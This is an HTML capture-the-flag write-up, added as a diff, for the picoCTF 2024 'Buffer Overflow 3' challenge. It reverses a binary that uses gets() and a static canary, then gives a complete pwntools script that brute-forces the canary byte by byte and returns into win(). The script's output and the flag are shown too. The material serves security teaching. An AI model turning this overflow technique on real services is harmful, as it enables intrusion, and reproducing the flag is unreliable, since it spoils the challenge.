@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>picoCTF 2024 — Buffer Overflow 3</title>
+  <meta name="description" content="Exploiting a classic stack buffer overflow to redirect execution flow and capture the flag.">
+  <meta name="keywords" content="pwn,binary,linux">
+  <meta name="ctf-event" content="picoCTF">
+  <meta name="ctf-difficulty" content="medium">
+  <meta name="date" content="2024-03-18">
+</head>
+<body>
+<article>
+<h1>picoCTF 2024 — Buffer Overflow 3</h1>
+
+<p><strong>Category:</strong> pwn &nbsp;|&nbsp; <strong>Points:</strong> 300 &nbsp;|&nbsp; <strong>Difficulty:</strong> Medium</p>
+
+<h2>Challenge Description</h2>
+
+<p>
+  Do you think you can bypass the canary? <br>
+  Connect to the program and get the flag.
+</p>
+
+<h2>Initial Analysis</h2>
+
+<p>Let's start by running <code>checksec</code> on the binary:</p>
+
+<pre><code>$ checksec --file=vuln
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre>
+
+<p>
+  So we have a stack canary to deal with. But note that this is a 32-bit binary with no PIE — 
+  that means we know exactly where the code lives in memory.
+</p>
+
+<h2>Reversing the Binary</h2>
+
+<p>Opening in Ghidra reveals the main loop:</p>
+
+<pre><code>void vuln() {
+  char buf[64];
+  char canary[4];
+  // canary is read from a FILE — not randomized!
+  gets(buf);
+}</code></pre>
+
+<p>
+  The key insight: the "canary" here isn't a real kernel stack canary — it's read from a file 
+  and stored as a fixed string. We can brute-force it one byte at a time!
+</p>
+
+<h2>Exploit Plan</h2>
+
+<ol>
+  <li>Brute-force the 4-byte canary (256^4 = 4 billion max, but one byte at a time = 256×4 = 1024 max attempts)</li>
+  <li>Overflow past the canary with our known value</li>
+  <li>Overwrite the return address with the address of <code>win()</code></li>
+</ol>
+
+<h2>Exploit Script</h2>
+
+<pre><code>from pwn import *
+
+binary = './vuln'
+elf    = ELF(binary)
+win    = elf.symbols['win']
+
+def try_canary(canary_prefix):
+    p = remote('saturn.picoctf.net', 50000)
+    p.recvuntil(b'>')
+    p.sendline(b'A' * 64 + canary_prefix)
+    response = p.recvline()
+    p.close()
+    return b'Stack Smashing' not in response
+
+# Brute-force the canary byte by byte
+canary = b''
+for _ in range(4):
+    for byte in range(256):
+        candidate = canary + bytes([byte])
+        if try_canary(candidate):
+            canary += bytes([byte])
+            log.success(f'Canary so far: {canary.hex()}')
+            break
+
+log.success(f'Full canary: {canary.hex()}')
+
+# Final exploit
+p = remote('saturn.picoctf.net', 50000)
+payload  = b'A' * 64          # fill buffer
+payload += canary              # correct canary
+payload += b'B' * 16          # saved registers
+payload += p32(win)            # overwrite return addr
+
+p.recvuntil(b'>')
+p.sendline(payload)
+p.interactive()</code></pre>
+
+<h2>Running the Exploit</h2>
+
+<pre><code>$ python3 exploit.py
+[+] Canary so far: 42
+[+] Canary so far: 4269
+[+] Canary so far: 426943
+[+] Full canary: 42694300
+[+] Opening connection to saturn.picoctf.net on port 50000
+[*] Switching to interactive mode
+picoCTF{Stat1c_c4n4r13s_4r3_b4d_db4e2c26}
+</code></pre>
+
+<h2>Flag</h2>
+
+<p><code>picoCTF{Stat1c_c4n4r13s_4r3_b4d_db4e2c26}</code></p>
+
+<h2>Key Takeaways</h2>
+
+<ul>
+  <li>Always check if stack canaries are truly random or file-based</li>
+  <li>One-byte-at-a-time brute-force dramatically reduces the search space</li>
+  <li>No PIE + known win() address = trivial ret2win after bypassing canary</li>
+</ul>
+
+</article>
+</body>
+</html>
